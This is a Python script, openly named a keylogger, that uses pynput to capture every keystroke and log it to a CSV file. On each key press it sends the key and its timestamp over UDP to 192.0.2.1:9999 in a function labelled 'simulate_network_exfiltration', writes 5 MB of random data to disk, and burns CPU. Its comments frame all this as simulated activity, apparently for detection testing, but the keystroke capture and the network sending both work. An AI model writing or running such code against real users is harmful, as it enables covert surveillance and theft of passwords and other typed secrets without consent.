import os
import socket
import time
from datetime import datetime
from pynput import keyboard
import threading
import random
import csv


# === Setup Paths ===
LOG_DIR = os.path.join(os.getcwd(), "log")
os.makedirs(LOG_DIR, exist_ok=True)

KEYLOG_FILE = os.path.join(LOG_DIR, "keylog.csv")
NOISE_FILE = os.path.join(LOG_DIR, "disk_noise.tmp")


class IntenseKeyloggerLogger:
    def __init__(self):
        self.running = True
        self.listener = keyboard.Listener(on_press=self.on_key_press)

        # Initialize CSV file
        self.csv_file = open(KEYLOG_FILE, 'a', newline='', buffering=1)
        self.writer = csv.writer(self.csv_file)

        # Write headers if file is new
        if os.stat(KEYLOG_FILE).st_size == 0:
            self.writer.writerow([
                "timestamp", "key", "disk_written_bytes",
                "cpu_cycles_simulated", "network_data_sent", "event"
            ])

    def on_key_press(self, key):
        try:
            key_str = key.char
        except AttributeError:
            key_str = str(key)

        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        disk_bytes = 5 * 1024 * 1024  # 5MB
        cpu_cycles = 10000  # CPU loop cycles
        network_data = f"Key={key_str}&Time={timestamp}"

        # Start all simulation functions
        threading.Thread(target=self.simulate_disk_noise, args=(disk_bytes,)).start()
        threading.Thread(target=self.simulate_cpu_load, args=(cpu_cycles,)).start()
        threading.Thread(target=self.simulate_network_exfiltration, args=(network_data,)).start()

        # Log the combined event
        self.writer.writerow([
            timestamp, key_str, disk_bytes, cpu_cycles, network_data, "keypress"
        ])

    def simulate_disk_noise(self, size_bytes):
        with open(NOISE_FILE, "ab") as f:
            f.write(os.urandom(size_bytes))

    def simulate_cpu_load(self, cycles):
        end_time = time.time() + 2
        while time.time() < end_time:
            _ = sum([random.randint(1, 100) ** 2 for _ in range(cycles)])

    def simulate_network_exfiltration(self, data):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
                s.connect(("192.0.2.1", 9999))
                s.send(data.encode())
        except Exception:
            pass

    def run(self):
        print("[🟡 LOGGER] Press any key to simulate and log activity (Ctrl+C to stop)...")
        self.listener.start()
        while self.running:
            time.sleep(1)

    def stop(self):
        self.running = False
        self.listener.stop()
        self.csv_file.close()


# === MAIN ===
if __name__ == "__main__":
    logger = IntenseKeyloggerLogger()
    try:
        logger.run()
    except KeyboardInterrupt:
        logger.stop()
        print("\n[🟢 LOGGER] Stopped and log file saved.")
